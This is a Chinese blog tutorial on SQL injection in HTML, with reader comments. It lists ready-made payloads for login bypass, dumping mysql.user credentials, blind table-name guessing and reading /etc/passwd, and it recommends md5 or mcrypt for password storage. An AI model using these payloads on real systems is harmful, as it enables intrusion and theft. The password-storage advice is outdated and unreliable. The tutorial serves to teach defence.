@@ -1,0 +1,815 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <!-- Google Tag Manager -->
+    <script>(function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':
+new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],
+j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
+'https://www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);
+})(window,document,'script','dataLayer','GTM-M3BFP5');</script>
+    <!-- End Google Tag Manager -->
+
+    <link href="/templates/static/css/files?default.less&other.less&ezHTML.less&?v=20180416-2" rel="stylesheet" type="text/css">
+    <script src="//ajax.googleapis.com/ajax/libs/jquery/1.3.1/jquery.min.js?v=20180416-2"></script>
+    <script src="/templates/static/js/files?lightHttp-simple-min.js&default.js&facebookAPI.js&form_check.js&util.js&listAutoLoadMore.js&?v=20180416-2"></script>
+    <script src="//www.puritys.me/templates/static/js/files?none" type="text/javascript" charset="utf-8"></script>
+
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta http-equiv="content-language" content="zh-TW" />
+    <meta name="author" content="Puritys" />
+    <title>SQL Injection 常見的駭客攻擊方式</title>
+    <meta name="keywords" content="SQL, 駭客" />
+    <meta name="description" content=" Sql Injection 應該可以說是目前網路上，駭客最常用的攻擊方式，因為攻擊方式簡單，又不需要使用任何軟體，或是自行撰寫程式。講到 SQL，就要提到資料庫，大多數的網站都會安裝資料庫伺服器(Database)，其實 Database 並不是什麼可怕的東西，Database 的功能就是將資料依序儲存下來，然後以最快的速度，找出你想要的資料，而在尋找資料之前，你必須輸入 D" />
+    <meta property="fb:app_id" content="160015347378316" />
+    <meta property="fb:admins" content="1140660203"/>
+    
+
+    <link rel="shortcut icon" href="/templates/static/images/favicon_puritys.ico" /> 
+    
+
+    <link rel="canonical" href="https://www.puritys.me/docs-blog/article-11-SQL-Injection-常見的駭客攻擊方式.html"/>
+    
+
+    <link rel="alternate" hreflang="zh-CN" href="https://www.puritys.me/zh_cn/docs-blog/article-11-SQL-Injection-常见的骇客攻击方式.html">
+        <link rel="alternate" hreflang="zh-TW" href="https://www.puritys.me/docs-blog/article-11-SQL-Injection-常見的駭客攻擊方式.html">
+        
+
+
+    <link rel="amphtml" href="https://www.puritys.me/docs-blog-amp/article-11-SQL-Injection-常見的駭客攻擊方式.html"/>
+    
+
+    <link rel="dns-prefetch" href="apis.google.com">
+        <link rel="dns-prefetch" href="ajax.googleapis.com">
+        <link rel="dns-prefetch" href="connect.facebook.net">
+        <link rel="dns-prefetch" href="www.google-analytics.com">
+        <link rel="dns-prefetch" href="www.puritys.me">
+        
+
+<!--[if lt IE 9]>
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/html5shiv/3.7.3/html5shiv.min.js"></script>
+    <![endif]-->
+    
+<script type="application/ld+json">
+{
+   "@context": "http://schema.org",
+   "@type": "WebSite",
+   "url": "//www.puritys.me",
+   "potentialAction": {
+     "@type": "SearchAction",
+     "target": "https://www.puritys.me/search?searchText={search_term_string}",
+     "query-input": "required name=search_term_string"
+   }
+}
+    </script>
+    
+
+
+<script type="application/ld+json">
+{ "@context" : "http://schema.org",
+  "@type" : "Organization",
+  "name" : "",
+  "url" : "//www.puritys.me",
+  "sameAs" : [ 
+    
+    "https://github.com/puritys",
+    
+    "https://www.facebook.com/Puritys.Chen.5815"
+    
+  ] 
+}
+    </script>
+
+
+
+
+
+
+
+</head>
+<body>
+
+            
+<!-- Google Tag Manager (noscript) -->
+<noscript><iframe src="https://www.googletagmanager.com/ns.html?id=GTM-M3BFP5"
+height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript>
+<!-- End Google Tag Manager (noscript) -->
+
+
+            
+<div class="settings">
+    
+        <script>var WRT="https://www.puritys.me/";</script>
+    
+</div>
+
+
+            
+<div class="header">
+    <div class="top-header">
+        <div class="main">
+        <a class="logo" href="/"><img src="/templates/static/images/logo_puritys.png" alt="Puritys Blog" title="Puritys Blog"></a>
+        <a class="navbar-btn" href="#"><span class="icon"></span></a>
+        </div>
+        <ul class="navbar">
+             
+            <li >
+                <a href="/news" data-ga='{"action":"menu_click","label":"\u7db2\u8def\u65b0\u805e"}'>網路新聞</a>
+            </li>
+             
+            <li >
+                <a href="/life" data-ga='{"action":"menu_click","label":"\u751f\u6d3b\u65c5\u904a"}'>生活旅遊</a>
+            </li>
+             
+            <li class="active">
+                <a href="/WEB_SECURITY" data-ga='{"action":"menu_click","label":"\u7db2\u8def\u5b89\u5168"}'>網路安全</a>
+            </li>
+             
+            <li >
+                <a href="/docs-cate" data-ga='{"action":"menu_click","label":"\u7a0b\u5f0f\u96dc\u8a18"}'>程式雜記</a>
+            </li>
+            
+        </ul>
+        <form action="/search" class="navbar-form">
+            <input type="text" name="searchText" placeholder="Input your keyword" value="">
+            <i class="glyphicon glyphicon-search"></i>
+        </form>
+    </div>
+</div>
+
+
+        
+
+        
+<div class="body-content">
+    
+            
+    <div class="main">
+        
+                
+<ul class="breadcrumb" itemscope itemtype="http://schema.org/BreadcrumbList"> 
+    <li itemprop="itemListElement" itemscope itemtype="http://schema.org/ListItem">
+        <a href="//www.puritys.me" itemscope itemtype="http://schema.org/Thing" itemprop="item">
+            <em><span itemprop="name">Home</span></em>
+        </a>
+        <meta itemprop="position" content="1" />
+    </li>
+    
+        
+            <li  itemprop="itemListElement" itemscope  itemtype="http://schema.org/ListItem">
+                <a href="/WEB_SECURITY" itemscope itemtype="http://schema.org/Thing" itemprop="item">
+                    <em><span itemprop="name">網路安全</span></em>
+                </a>
+                <meta itemprop="position" content="2" />
+            </li>
+        
+    
+        
+            <li class="active">
+                <a href="//www.puritys.me/docs-blog/article-11">
+                    <em><span>SQL Injection 常見的駭客攻擊方式</span></em>
+                </a>
+            </li>
+        
+    
+</ul>
+
+        
+                
+
+
+<script type="application/ld+json">
+    {"@context":"http:\/\/schema.org","@type":"Article","mainEntityOfPage":{"@type":"WebPage","@id":"https:\/\/www.puritys.me\/docs-blog\/article-11-SQL-Injection-\u5e38\u898b\u7684\u99ed\u5ba2\u653b\u64ca\u65b9\u5f0f.html"},"headline":"SQL Injection \u5e38\u898b\u7684\u99ed\u5ba2\u653b\u64ca\u65b9\u5f0f","image":"","datePublished":"2011-02-03T02:42:42+08:00","dateModified":"2016-11-25T01:27:20+08:00","author":{"@type":"Person","name":"puritys"},"publisher":{"@type":"Organization","name":"www.puritys.me","logo":{"@type":"ImageObject","url":"https:\/\/www.puritys.me\/templates\/static\/images\/favicon_puritys.ico"}},"description":" \rSql Injection \u61c9\u8a72\u53ef\u4ee5\u8aaa\u662f\u76ee\u524d\u7db2\u8def\u4e0a\uff0c\u99ed\u5ba2\u6700\u5e38\u7528\u7684\u653b\u64ca\u65b9\u5f0f\uff0c\u56e0\u70ba\u653b\u64ca\u65b9\u5f0f\u7c21\u55ae\uff0c\u53c8\u4e0d\u9700\u8981\u4f7f\u7528\u4efb\u4f55\u8edf\u9ad4\uff0c\u6216\u662f\u81ea\u884c\u64b0\u5beb\u7a0b\u5f0f\u3002\u8b1b\u5230 SQL\uff0c\u5c31\u8981\u63d0\u5230\u8cc7\u6599\u5eab\uff0c\u5927\u591a\u6578\u7684\u7db2\u7ad9\u90fd\u6703\u5b89\u88dd\u8cc7\u6599\u5eab\u4f3a\u670d\u5668("}
+</script>
+
+
+<div class="entry">
+   <div class="entry-header">
+        
+        <div class="date">
+            <div class="year">2011</div>
+            <div class="month">Feb</div>
+            <div class="day">03</div>
+        </div>
+
+        
+        <div class="title">
+            <h1><a href="/docs-blog/article-11-SQL-Injection-常見的駭客攻擊方式.html"><span>SQL Injection 常見的駭客攻擊方式</span></a></h1>
+            <div class="sub">
+                <div class="caption">Tags:</div>
+                <ul class="labels">
+                    
+                    <li class="label">
+                        <a class="label-item" target="_blank"
+                             href="/docs-cate?tag=SQL">SQL</a>
+                    </li>
+                    
+                    <li class="label">
+                        <a class="label-item" target="_blank"
+                             href="/docs-cate?tag=駭客">駭客</a>
+                    </li>
+                    
+                </ul>
+            </div>
+            
+            <div class="lang-wrap">
+            
+                <a href="https://www.puritys.me/zh_cn/docs-blog/article-11-SQL-Injection-常见的骇客攻击方式.html" rel="alternate" hreflang="zh-CN">簡中版</a>
+            
+            </div>
+            
+        </div>
+    </div>
+
+    
+    <div class="entry-body">
+        <div class="ezHTML-content"> <br /><p>Sql Injection 應該可以說是目前網路上，駭客最常用的攻擊方式，因為攻擊方式簡單，又不需要使用任何軟體，或是自行撰寫程式。講到 SQL，就要提到資料庫，大多數的網站都會安裝資料庫伺服器(Database)，其實 Database 並不是什麼可怕的東西，Database 的功能就是將資料依序儲存下來，然後以最快的速度，找出你想要的資料，而在尋找資料之前，你必須輸入 Database 指令，你輸入的這串指令，我們就稱為 SQL 語法。</p><p>Sql Injection 就是指 SQL 語法上的<em class="em">漏洞</em>，藉由特殊字元，改變語法上的邏輯，駭客就能取得資料庫的所有內容，當然也包含了會員的帳號，密碼，下面就舉一個SQL登入漏洞：</p><p>一個有會員登入功能的網站，都會需要輸入帳號與密碼來進行驗證</p><p>而後端程式，如 PHP 就必需支援相關的登入檢查，判定 User 輸入的帳號、密碼是否正確，來確定登入是否成功 ，PHP 執行的 SQL 語法如下，這是一個簡單的 SQL 語法，主要功能是從 members 這個資料表中，取出符合 User 所輸入帳號與密碼的會員資料。</p><blockquote>select * from members where account=&#39;$name&#39; and password=&#39;$password&#39;</blockquote><p>但若是駭客輸入有特殊字元的帳號：「 <em class="em">&#39; or 1=1 /*</em> 」，密碼：「任意值」</p><p>這時SQL語法就會變成：</p><blockquote>select * from members where <em class="em">account=&#39;&#39; or 1=1 /*</em>&#39; and password=&#39;&#39;</blockquote><p>因為「<em class="em">/*</em>」在 MySQL 語法中代表註解的意思，所以「/*」後面的字串通通沒有執行，而這句判斷式「<em>1=1</em>」永遠成立，駭客就能登入此網站成功。</p><h3>SQL 語法的註解</h3><p>SQL 註解的語法有以下三種，不同的 SQL 版本，會吃不同的語法。</p><ul class="list">  <li>「<b>/*</b>」  MySQL</li>  <li>「<b>--</b>」  MsSQL</li>  <li>「<b>#</b>」   MySQL ，  # 對於 browser 來說是有意義的，那是錨點的意思，所有必須先透過 Url Encode 後的代碼 「<b>%23</b>」 來代替。</li></ul><h2>防護方式</h2><p>Sql Injection攻擊很簡單，不過防護也不難，只要過瀘字串「&#39;」，即可，當然如果你的SQL語法寫得很糟，保險的做法是過瀘「&#39; " 」等字串，並檢查變數型態「數字、字元、字串」，另外會員的密碼最好是經過加密，如 md5 或 Double md5 演算法加密，這樣就能避免資料外洩時，密碼也同時外洩，還有要特別注意，md5 目前已經有破解方式，改用 mcrypt 會是更好的加密方式。</p><p>PHP 過瀘 SQL Injection 的語法：</p><blockquote>$name = preg_replace("/[&#92;&#39;&#92;"]+/" , &#39;&#39; ,$name);</blockquote><div class="codeBlock php"><span class="title"> 另一種過瀘方式</span><pre class="prettyprint lang-php linenums" ><ol class="linenums"><li class="L0"><span class="pln">$str </span><span class="pun">=</span><span class="pln"> </span><span class="str">"&#39;&#92;""</span><span class="pun">;</span></li><li class="L1"><span class="pln">$replace </span><span class="pun">=</span><span class="pln"> array</span><span class="pun">(</span><span class="str">"&#39;"</span><span class="pln"> </span><span class="pun">=&gt;</span><span class="pln"> </span><span class="str">"&amp; #39;"</span><span class="pun">,</span><span class="pln"> </span><span class="str">"&#92;""</span><span class="pln"> </span><span class="pun">=&gt;</span><span class="pln"> </span><span class="str">"&amp; quot;"</span><span class="pun">);</span><span class="pln"> </span><span class="com">//請自已把 &amp; # , &amp; q 中間的空白移除</span></li><li class="L2"><span class="pln">$str </span><span class="pun">=</span><span class="pln"> strtr</span><span class="pun">(</span><span class="pln">$str</span><span class="pun">,</span><span class="pln"> $replace</span><span class="pun">);</span></li></ol></pre></div><p>Sql Injection的攻擊方式會因不同的資料庫而有不同的語法， 如 MsSQL的註解是用 「<em>--</em>」MySQL的另一個註解是用 「<em>#</em>」。</p><h2>SQL Injection 攻擊</h2><h3>取得 Table name</h3><p>如果網站連接 database 使用的帳號，有權限讀取 INFORMATION_SCHEMA database，這樣就能直接搜尋任何一個 table 名稱，如</p><ul class="list">  <li>[Oracle]: <em>or EXISTS(SELECT 1 FROM dual WHERE database() LIKE &#39;%xxx%&#39;) AND &#39;&#39;=&#39;</em></li>  <li>[MySQL]: <em>or EXISTS(SELECT * FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA like &#39;%xxxx%&#39;) AND &#39;&#39;=&#39;</em></li>  <li>union select%20host,user,password fROM mysql.user limit 1,1#</li>  <li>union select engine, table_rows, table_name from INFORMATION_SCHEMA.TABLES where TABLE_SCHEMA not in (&#39;information_schema&#39;)  limit 1,1#</li>  <li>union select host,db,user from mysql.db limit 1,1 #</li></ul><p>取得所有資料庫名稱</p><ul class="list">  <li>sqlInjection.php?id=1&#39; union select distinct table_schema  from information_schema.tables;</li>  <li>sqlInjection.php?id=1&#39; union select group_concat(table_schema) from information_schema.tables;</li></ul><p>取得所有資料表名稱</p><ul class="list">  <li>sqlInjection.php?id=1&#39; union select group_concat(table_name) from information_schema.tables--</li></ul><p>一般來說，information_schema 這個資料庫是沒有權限讀取的，尤其是市面上常見的虛擬主機，大部分的虛擬主機只能使用伺服器給的控制台來新增資料庫，沒辦法透過程式讀取所有的資料庫，這時駭客們會開始用猜的方式，來取得資料表的名稱，例如會員資料常會使用的 table 名稱為 users , members 等等。</p><p>猜測 table name 的 SQL Injection 如下，使用 or exists(select 1 from  members);</p><ul class="list">  <li>sqlInjection.php?id=1&#39; or exists(select 1 from members)/*</li>  <li>sqlInjection.php?id=1&#39; or exists(select 1 from admin)%23</li>  <li>sqlInjection.php?id=1&#39; or exists(select 1 from products)--</li></ul><h3>暴力猜測 Table Name</h3><p>資料表的名稱不一定都是英文單字，有些工程師會使用怪怪的命名，這時駭客還是可以使用<b>暴力破解</b>的方式，將 Table Name 拼出來。</p><p>SQL 有個 function : <b>substring</b> ，這個功能可以對字串做切割，駭客可以先將「字串」切割成一個字元。</p><p>接著使用 ord 將字元轉成 Ascii Code ，然後去比對他的 Ascii Code  是否 = 32~ 127 ， <b>a = 97</b>, <b>b = 98</b></p><blockquote>看一個範例，我要比對 information_schema.tables 第一筆資料的第一個 table_name ，其中的第一個字元。</blockquote><ul class="list">  <li>id=1&#39; and 97=(select <b>ord(substring(table_name, 1,1)</b> from information_schema.tables limit 0,1)--</li>  <li>id=1&#39; and 98=(select ord(substring(table_name, 1,1) from information_schema.tables limit 0,1)--</li>  <li>id=1&#39; and 99=(select ord(substring(table_name, 1,1) from information_schema.tables limit 0,1)--</li></ul><br /><br /><blockquote>再看一個範例，我要比對 information_schema.tables 第一筆資料的第一個 table_name ，其中的第二個字元。</blockquote><ul class="list">  <li>id=1&#39; and 97=(select ord(substring(table_name, 2,1) from information_schema.tables limit 0,1)--</li>  <li>id=1&#39; and 98=(select ord(substring(table_name, 2,1) from information_schema.tables limit 0,1)--</li>  <li>id=1&#39; and 99=(select ord(substring(table_name, 2,1) from information_schema.tables limit 0,1)--</li></ul><h3>取得 MySQL 資料庫相關訊息</h3><p>取得連線帳號 user()</p><ul class="list">  <li>sqlInjection.php?id=1&#39; select 1,2,user()/*</li></ul><p>取得 Mysql 版本 version()</p><ul class="list">  <li>sqlInjection.php?id=1&#39; select 1,2,version()/*</li></ul><h3>讀取系統檔案內容</h3><p>透過 mysql 的 method 「load_file」，駭客就能輕易取得網站的檔案內容。</p><ul class="list">  <li>union select 1,2,load_file(&#39;/etc/passwd&#39;)</li></ul><h2>使用 PDO 防止 SQL Injection</h2><blockquote><a href="http://us3.php.net/manual/en/book.pdo.php"  target="_blank">http://us3.php.net/manual/en/book.pdo.php</a></blockquote><p>PDO 是一個可以 query 資料庫的程式，我們能夠透過 PDO 連到 Mysql server，重要的是 PDO 有提供 SQL Injection 的防護機制，使用 bindValue 的方式，PDO 會自動檢查數據格式，並轉換特殊字元，再將 User Input 填入 SQL 語法中。</p><div class="codeBlock php"><span class="title"> PDO 使用方式</span><pre class="prettyprint lang-php linenums" ><ol class="linenums"><li class="L0"><span class="pln">$db </span><span class="pun">=</span><span class="pln"> </span><span class="kwd">new</span><span class="pln"> PDO </span><span class="pun">(</span><span class="str">"mysql:dbname=test;host=localhost;port=3306"</span><span class="pun">,</span><span class="pln"> </span><span class="str">&#39;username&#39;</span><span class="pun">,</span><span class="pln"> </span><span class="str">&#39;password&#39;</span><span class="pun">,</span><span class="pln"> array</span><span class="pun">(</span><span class="pln"> PDO</span><span class="pun">::</span><span class="pln">MYSQL_ATTR_INIT_COMMAND </span><span class="pun">=&gt;</span><span class="pln"> </span><span class="str">&#39;SET NAMES &#92;&#39;UTF8&#92;&#39;&#39;</span><span class="pun">));</span></li><li class="L1"><span class="pln">&nbsp;</span></li><li class="L2"><span class="pln">$sth </span><span class="pun">=</span><span class="pln"> $db</span><span class="pun">-&gt;</span><span class="pln">prepare</span><span class="pun">(</span><span class="str">&#39;select  * from table where id =:id and title= :title &#39;</span><span class="pun">);</span></li><li class="L3"><span class="pln">&nbsp;</span></li><li class="L4"><span class="pln">$sth</span><span class="pun">-&gt;</span><span class="pln">bindValue</span><span class="pun">(</span><span class="str">&#39;:id&#39;</span><span class="pun">,</span><span class="pln"> $_GET</span><span class="pun">[</span><span class="str">&#39;id&#39;</span><span class="pun">],</span><span class="pln"> PDO</span><span class="pun">::</span><span class="pln">PARAM_INT</span><span class="pun">);</span></li><li class="L5"><span class="pln">&nbsp;</span></li><li class="L6"><span class="pln">$sth</span><span class="pun">-&gt;</span><span class="pln">bindValue</span><span class="pun">(</span><span class="str">&#39;:title&#39;</span><span class="pun">,</span><span class="pln"> $_GET</span><span class="pun">[</span><span class="str">&#39;title&#39;</span><span class="pun">],</span><span class="pln"> PDO</span><span class="pun">::</span><span class="pln">PARAM_STR</span><span class="pun">);</span></li><li class="L7"><span class="pln">&nbsp;</span></li><li class="L8"><span class="pln">$sth</span><span class="pun">-&gt;</span><span class="pln">execute</span><span class="pun">();</span></li><li class="L9"><span class="pln">$sth</span><span class="pun">-&gt;</span><span class="pln">fetch</span><span class="pun">(</span><span class="pln">PDO</span><span class="pun">::</span><span class="pln">FETCH_ASSOC</span><span class="pun">);</span></li></ol></pre></div><ul class="list">  <li>PDO::PARAM_INT 數字</li>  <li>PDO::PARAM_STR 字串</li></ul><h2>相關教學下載</h2><ul class="list">  <li><a href="/filemanage/blog_files/advance_sql_injection.pdf" target="_blank">advance SQL Injection</a></li></ul></div>
+    </div>
+    <div class="entry-footer">
+        <p class="article-modify-author">This post was last modified by
+            <span>puritys</span>
+            <time datetime="2016-11-25T01:27:20+08:00" class="article-modify-time">2016/11/25</time>
+        </p>
+
+        
+    <ul class="share-btn-wrap">
+        <li><a href="https://www.facebook.com/sharer/sharer.php?u=https://www.puritys.me/docs-blog/article-11" class="shareBtn" title="share" rel="nofollow"></a></li>
+        <li>
+            <iframe src="https://www.facebook.com/plugins/like.php?href=https://www.puritys.me/docs-blog/article-11" scrolling="no" frameborder="0"
+                style="border:none; width:450px; height:80px"></iframe>
+        </li>
+    </ul>
+
+
+
+        
+        
+        <div class="next-article-box">
+            <div class="prev-article">
+                
+                <a href="/docs-blog/article-226">六種常見的駭客攻擊方式</a>
+                &nbsp;
+            </div>
+            <div class="next-article">
+                
+                <a href="/docs-blog/article-78">XSS 攻擊</a>
+                &nbsp;
+            </div>
+        </div>
+        
+        
+    </div>
+    
+    
+        <br />
+        <ins class="adsbygoogle"
+     style="display:inline-block;width:728px;height:90px"
+     data-ad-client="ca-pub-1449650742587459"
+     data-ad-slot="2197220184"></ins>
+
+<script>
+(adsbygoogle = window.adsbygoogle || []).push({});
+</script>
+
+<script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
+<script>
+     (adsbygoogle = window.adsbygoogle || []).push({
+          google_ad_client: "ca-pub-1449650742587459",
+          enable_page_level_ads: true
+     });
+</script>
+    
+
+</div>
+
+        
+                
+
+<div class="comment-group clearfix" >
+    <h2>目前回應 Comments<em>(15 comments)</em></h2>
+    <ul class="media-list media-list-comment">
+        
+        <li class="media clearfix">
+            <a class="media-thumb pull-left" href="#"><img class="media-object" src="//www.puritys.me/templates/static/images/thumb_avatar.png"></a>
+            <div class="media-body clearfix">
+                <h4 class="media-heading">
+                    <a href="#">狼圖騰</a>
+                    <span class="media-sub">2016/11/29</span>
+                </h4>
+                <p>回覆你的留言<br /><br />我覺得兩個都可以做 (跳脫函式或bind + NCR)<br /><br />即使 NCR 那邊達到跳脫的效果，至少有幾點是比較好的：<br /><br />1. 你有照文件的規格去寫。就像你開發的東西也希望別人照你的方式去寫一樣。<br />2. NCR 與此函式並不衝突。<br /><br />-----------------------------<br />文件那邊的<br />$name = preg_replace(&quot;/[&#39;&quot;]+/&quot; , &#39;&#39; ,$name);<br />其實也最好改用 mb_ereg_replace...<br />UTF-8 其實是不會出事， big5 專案怕的是中文字含有單引號或雙引號的 ascii 碼就這樣被拆掉了</p>
+                
+                <a class="btn pull-right" href="#">Reply</a>
+                <div class="media">
+                    <a class="media-thumb pull-left" href="#"><img class="media-object" src="//www.puritys.me/templates/static/images/thumb_avatar.png"></a>
+                    <div class="media-body clearfix">
+                        <h4 class="media-heading">
+                            <a href="#">Admin</a>
+                            <span class="media-sub"></span>
+                        </h4>
+                        <p><p>	感謝提醒，我比較少考慮 Big5 的問題，因為我一接觸程式沒多久，UTF-8 就已經出現了，為了處理許功蓋先生留下的問題，我開發的程式，都已經全面使用 UTF-8 ，目前傾向開發人員不要再使用 Big5 編碼的文件/資料庫，最好是都改用 UTF-8 ，這樣可以減少很多編碼的問題。</p></p>
+                    </div>
+                </div>
+                
+            </div>
+        </li>
+        
+        <li class="media clearfix">
+            <a class="media-thumb pull-left" href="#"><img class="media-object" src="//www.puritys.me/templates/static/images/thumb_avatar.png"></a>
+            <div class="media-body clearfix">
+                <h4 class="media-heading">
+                    <a href="#">狼圖騰</a>
+                    <span class="media-sub">2016/09/21</span>
+                </h4>
+                <p>不管是不是 PDO, PHP 資料庫都有提供一個函式提供跳脫<br />一定要呼叫那個函式 (例如使用 mysql_connect 的相關函式就是 mysql_real_escape_string, PDO 的話就是本文寫的 bindParam 或是 $dbh->quote 函式)<br />其實有二個很重要的理由如下<br /><br />1. 跳脫規則會隨著資料庫類型改變<br />MySQL 使用 &#39; 跳脫，其它資料庫使用 &#39;&#39; 跳脫。使用相關函式會幫你改變相對應規則。<br /><br />2. PHP 的字元類型實際上是 bytes 類型，資料庫字元類型實際上是真的字元類型<br /><br />試試下面的程式碼 (此例子為 big5 或是 gbk 編碼環境，不適用於 UTF-8)<br /><br />header(&#39;Content-Type: text/plain; charset=big5&#39;);<br />echo addslashes(&quot;xbfx27&quot;); // 企圖將所有 單引號、雙引號、反斜述 前面加上反斜線以跳脫問題<br />// 結果會印出 璞&#39;<br /><br />問題在於 PHP 的字元型態是 bytes, 對於 xbfx27 會把它當成兩個字看。然後跳脫完成變成 xbfx5cx27<br />送進資料庫時，xbfx5c 為一個字元 (因為 big5 或是 gbk 編碼)，不會把後面的 x5c (反斜線) 當成脫跳字元看待。然後後面的 x27 (&#39;單引號) 就很神奇的發揮作用了<br />--------------------------------------<br /><br />可能還有其它的問題，我想表達的是，<br />資料庫函式一定有提供一個函式來解決注入問題。<br /><br />請各位不要自己自作聰明開發相對應方法，<br />確實看清楚資料庫文件手冊並確實地呼叫這些對應函數。<br />(如果你有用 PHP Framework 的話一樣要看清楚相對應手冊)</p>
+                
+                <a class="btn pull-right" href="#">Reply</a>
+                <div class="media">
+                    <a class="media-thumb pull-left" href="#"><img class="media-object" src="//www.puritys.me/templates/static/images/thumb_avatar.png"></a>
+                    <div class="media-body clearfix">
+                        <h4 class="media-heading">
+                            <a href="#">Admin</a>
+                            <span class="media-sub"></span>
+                        </h4>
+                        <p><p>	官方提供的方式也不一定安全，有些狀況，官方會認為開發人員自已也要懂 Security ，工程師自已製造的洞，官方也不會理你的 ，像跳脫字元，我個人就覺得是一個很不安全的處理方式，如果你存了一個 (跳脫字元+雙引號) 進資料庫，那麼你再用 SQL Query 從資料庫拿出來，最後你拿到的資料到底是什麼?，還有你後續對這筆資料的處理也要非常小心，因為他存在 &quot; 雙引號，這些都增加了軟體工程師的負擔，每寫一行 code ，都要思考各種極端狀況。</p><p>	&nbsp;</p><p>	我的文章會提到&nbsp;<a href="https://en.wikipedia.org/wiki/Numeric_character_reference" target="_blank">NCR</a> ，直接把 &quot; &#39; 轉成 &amp;#xxx; 這種 NCR 格式，就是不希望後端工程師在做資料處理的時候，還會遇到單/雙引號的問題，而 NCR 在網頁上的顯示會是正常的單/雙引號，所以並不會影響到用戶，這招算是比較爆力的解法，當然直接轉 NCR 這個方法是有些限制的，例如你要確認後端的資料搜尋是否需要支援單/雙引號 &nbsp;( &amp;#39; 會影響到搜尋 39 這個數字的結果)。&nbsp;</p></p>
+                    </div>
+                </div>
+                
+            </div>
+        </li>
+        
+        <li class="media clearfix">
+            <a class="media-thumb pull-left" href="#"><img class="media-object" src="//www.puritys.me/templates/static/images/thumb_avatar.png"></a>
+            <div class="media-body clearfix">
+                <h4 class="media-heading">
+                    <a href="#">菲</a>
+                    <span class="media-sub">2016/02/15</span>
+                </h4>
+                <p>更正~<br /><br />原資料庫的設定為 latin1, 要把資料全數轉到 utf8 的資料庫</p>
+                
+                <a class="btn pull-right" href="#">Reply</a>
+                <div class="media">
+                    <a class="media-thumb pull-left" href="#"><img class="media-object" src="//www.puritys.me/templates/static/images/thumb_avatar.png"></a>
+                    <div class="media-body clearfix">
+                        <h4 class="media-heading">
+                            <a href="#">Admin</a>
+                            <span class="media-sub"></span>
+                        </h4>
+                        <p><p>	<span style="font-size:16px;">資料庫設定 latin1 ，不代表你存進去的文字編碼就是 latin1 ，有可能你存進去的文字其實是 Big5 編碼。</span></p><p>	&nbsp;</p><p>	<span style="font-size:16px;">可以先用 mysqldump &nbsp;把資料表內容存在一個檔案裡：</span></p><p>	<span style="font-size:16px;"><span style="font-family:arial,helvetica,sans-serif;">例如：</span><span style="color:#b22222;"><span style="font-family:arial,helvetica,sans-serif;"> &nbsp;mysqldump -hlocalhost -uroot&nbsp;<span style="line-height: 24px;">--add-drop-database&nbsp;</span>--database test --table book --default-character-set=latin1 -p &gt; tmp</span></span><span style="color: rgb(178, 34, 34);">&nbsp;</span></span></p><p>	<span style="font-size:16px;">再來編輯 tmp 檔案，將所有的 CHARSET=latin1 改成&nbsp;CHARSET=utf8</span></p><p>	&nbsp;</p><p>	<span style="font-size:16px;">接著你要先檢查你存進資料庫的中文字到底是 Big5 還是 UTF8 編碼，確定編碼方式後，才能執行下面的編碼轉換：</span></p><p>	<span style="font-size: 16px;">如果你的中文是用 Big5 存進 latin1 資料庫，那麼你要用指令 </span><span style="font-size: 16px; color: rgb(178, 34, 34);">&nbsp;iconv -f big5 -t utf8 tmp&nbsp;&gt; new.sql</span><span style="font-size: 16px;"> &nbsp;來轉換文字編碼，我猜你的資料庫應該會是這一種。</span></p><div>	&nbsp;</div><div>	&nbsp;</div><div>	<span style="font-size:16px;">轉換完成後， new.sql 這個檔案就會是 UTF8 編碼的 SQL 語法 ，重新匯入資料庫即可，</span><br />	<br />	<div>		<span style="font-size:16px;"><span style="color:#b22222;">mysql -hlocalhost -uroot --default-character-set=utf8 <span style="font-family: arial, helvetica, sans-serif;">&quot;test&quot; -p&nbsp;</span>&lt; new.sql&nbsp;</span></span></div>	<div>		&nbsp;</div>	<div>		&nbsp;</div>	<div>		&nbsp;</div>	<span style="font-size:16px;">另外 &nbsp;PHP Query MySql 前，都要先設定 UTF8 編碼：&nbsp;<span style="color:#b22222;">query(&quot;SET NAMES utf8&quot;)</span>; &nbsp; 。</span></div><div>	&nbsp;</div><div>	&nbsp;</div><div>	&nbsp;</div></p>
+                    </div>
+                </div>
+                
+            </div>
+        </li>
+        
+        <li class="media clearfix">
+            <a class="media-thumb pull-left" href="#"><img class="media-object" src="//www.puritys.me/templates/static/images/thumb_avatar.png"></a>
+            <div class="media-body clearfix">
+                <h4 class="media-heading">
+                    <a href="#">菲</a>
+                    <span class="media-sub">2016/02/15</span>
+                </h4>
+                <p>不好意思, 在這問其他類型問題, 還請高人指點!!<br />請問, 要如何將原編碼為 big5的資料庫轉到另一編碼為 utf8的資料庫?</p>
+                
+            </div>
+        </li>
+        
+        <li class="media clearfix">
+            <a class="media-thumb pull-left" href="#"><img class="media-object" src="//www.puritys.me/templates/static/images/thumb_avatar.png"></a>
+            <div class="media-body clearfix">
+                <h4 class="media-heading">
+                    <a href="#">菲</a>
+                    <span class="media-sub">2016/01/03</span>
+                </h4>
+                <p>請問~<br />使用此方法是否會讓頁面跑的比較慢?<br />另外, 是否需要將如 $query = $db->prepare(&quot;&quot;); 的 $query 關閉? <br />還有, 是否也需要在結尾也將開啟的資料庫也關閉, 如設定 $query = null;</p>
+                
+                <a class="btn pull-right" href="#">Reply</a>
+                <div class="media">
+                    <a class="media-thumb pull-left" href="#"><img class="media-object" src="//www.puritys.me/templates/static/images/thumb_avatar.png"></a>
+                    <div class="media-body clearfix">
+                        <h4 class="media-heading">
+                            <a href="#">Admin</a>
+                            <span class="media-sub"></span>
+                        </h4>
